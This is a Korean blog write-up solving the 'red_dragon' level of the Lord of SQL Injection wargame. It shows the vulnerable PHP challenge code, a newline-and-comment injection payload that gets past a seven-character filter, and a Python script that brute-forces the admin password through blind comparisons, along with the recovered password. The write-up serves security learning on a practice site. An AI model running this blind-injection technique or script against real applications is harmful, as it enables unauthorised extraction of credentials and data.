---
title: "[Lord of SQL Injection] LoS - red_dragon 문제풀이"
date: 2018-09-08
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

정신 차려보니 `green_dragon` 문제를 푼지 벌써 2주가 지나있다.
그동안 휴가도 다녀오고 휴가를 다녀오느라 못한 일들을 하느라 정신이 없었다.
`red_dragon`을 오랜만에 풀어보았는데 좀 어려웠다 ㅠㅠ  

<!--more-->

코드는 다음과 같다.  

```php
------------------------------------------------------------------------------------
query : select id from prob_red_dragon where id='' and no=1
------------------------------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\./i', $_GET['id'])) exit("No Hack ~_~");
  if(strlen($_GET['id']) > 7) exit("too long string");
  $no = is_numeric($_GET['no']) ? $_GET['no'] : 1;
  $query = "select id from prob_red_dragon where id='{$_GET[id]}' and no={$no}";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_red_dragon where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("red_dragon");
  highlight_file(__FILE__);
?>
```

이번엔 `id`와 `no`를 입력 받는다.
그런데 `id`는 `7글자`를 넘을 수 없고, `no`에는 순전히 `숫자`만 들어갈 수 있다.
그래서 처음에는 `id가 admin인 행의 no를 찾아보자!`라고 생각했는데, `no`가 아무래도 작은 수는 아닌가보다.
그리고 문제를 풀려면 정확한 pw의 값이 필요한데, 이 방법으로는 그걸 알아낼 수도 없다.
한참을 고민했는데 모르겠어서 주변의 `웹잘알`님께 물어보았다.
그랬더니 아래와 같은 방법을 알려주었다.  

```plain
?id='||pw>%23&no=%0a0x61
```

이렇게 입력하면 완성되는 쿼리는 다음과 같다.  

```mysql
select id from prob_red_dragon where id=''||pw>#' and no=
0x61
```

`no=` 다음에 `%0a`를 입력했기 때문에 뒤의 `0x61`은 다음 줄에 들어간다.
`#`은 `MySQL`에서 한 줄 주석 문자이며, `MySQL`에서는 여러 줄에 걸쳐 쿼리를 입력할 수 있다.
그래서 위의 쿼리문에서 주석처리되는 부분과 개행을 빼고 깔끔하게 정리하면 아래와 같이 된다.  

```mysql
select id from prob_red_dragon where id=''||pw>0x61
```

헤...
이러면 한 글자 씩 pw를 비교할 수 있다!
아래는 내 서버에서 테스트 해 본 결과이다.  

```bash
mysql> select * from user where id='admin' and pw>0x61;
+---------+----------+
| id      | pw       |
+---------+----------+
| admin   | asdawqwe |
+---------+----------+
1 row in set (0.00 sec)

mysql> select * from user where id='admin' and pw>0x62;
Empty set (0.00 sec)

mysql> select * from user where id='admin' and pw>0x6172;
+---------+----------+
| id      | pw       |
+---------+----------+
| admin   | asdawqwe |
+---------+----------+
1 row in set (0.00 sec)

mysql> select * from user where id='admin' and pw>0x6173;
+---------+----------+
| id      | pw       |
+---------+----------+
| admin   | asdawqwe |
+---------+----------+
1 row in set (0.01 sec)

mysql> select * from user where id='admin' and pw>0x6174;
Empty set (0.00 sec)
```

위와 같이 pw를 한 글자 씩 비교할 수 있는데, `=`이 아닌 `>`를 통해 비교하고 있기 때문에 결과값이 나오지 않는 순간의 직전 값이 pw의 정확한 값이 된다.
따라서 문제에서 pw의 값을 `hex` 값으로 비교를 하다가 `Hello admin`이 안나온다면 그 값에서 `-1`을 한 값이 pw가 된다.
그런데 마지막 글자를 찾을 때는 다르다.  

```bash
mysql> select * from user where id='admin' and pw>0x6173646177717764;
+---------+----------+
| id      | pw       |
+---------+----------+
| admin   | asdawqwe |
+---------+----------+
1 row in set (0.00 sec)

mysql> select * from user where id='admin' and pw>0x6173646177717765;
Empty set (0.00 sec)
```

위의 예시에서도 알 수 있듯이 마지막 글자는 `Hello admin`이 나오지 않은 값이 정확한 pw의 값이다.
이를 바탕으로 아래와 같이 코드를 구현했다.  

```python
import requests

flag = "0x"

url = "http://los.rubiya.kr/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find password"

for j in range(1, 20):
	found = False
	for i in range(48, 128):
		try:
			query = url + "'||pw>%23&no=%0a" + flag + hex(i)[2:]
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if 'Hello admin' not in r.text:
			flag += str(hex(i - 1))[2:]
			print "[+] Found " + str(j), ":", flag
			found = True
			break
	if not found:
		print "[+] Found password finished"
		break
	
flag = flag[2:].decode("hex")
flag = flag[:-1] + chr(ord(flag[-1]) + 1)
print "[+] Found password : ", flag
print "[+] End"
```

pw의 길이를 모르기 때문에 일단 20까지 반복문을 돌렸다.
그리고 마지막 글자는 `Hello admin`이 나오지 않은 그 순간의 값이기 때문에 다시 `+1`을 해 출력 해 주었다.
그 결과 다음과 같았다.  

```bash
$ python ex.py 
[+] Start
[+] Find password
[+] Found 1 : 0x41
[+] Found 2 : 0x4135
[+] Found 3 : 0x413533
[+] Found 4 : 0x41353344
[+] Found 5 : 0x4135334444
[+] Found 6 : 0x413533444434
[+] Found 7 : 0x41353344443436
[+] Found 8 : 0x4135334444343640
[+] Found password finished
[+] Found password :  A53DD46A
[+] End
```

이 전의 문제에서도 pw의 값은 소문자였기 때문에 이번에도 아래와 같이 소문자로 입력 해 주었다.  

```plain
?pw=a53dd46a
```

그 결과 문제를 풀 수 있었다.  

```php
----------------------------------------------------------------------------------
query : select id from prob_red_dragon where id='' and no=1
----------------------------------------------------------------------------------

RED_DRAGON Clear!
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\./i', $_GET['id'])) exit("No Hack ~_~");
  if(strlen($_GET['id']) > 7) exit("too long string");
  $no = is_numeric($_GET['no']) ? $_GET['no'] : 1;
  $query = "select id from prob_red_dragon where id='{$_GET[id]}' and no={$no}";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_red_dragon where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("red_dragon");
  highlight_file(__FILE__);
?>
```

---

```plain
RED_DRAGON Clear!!
```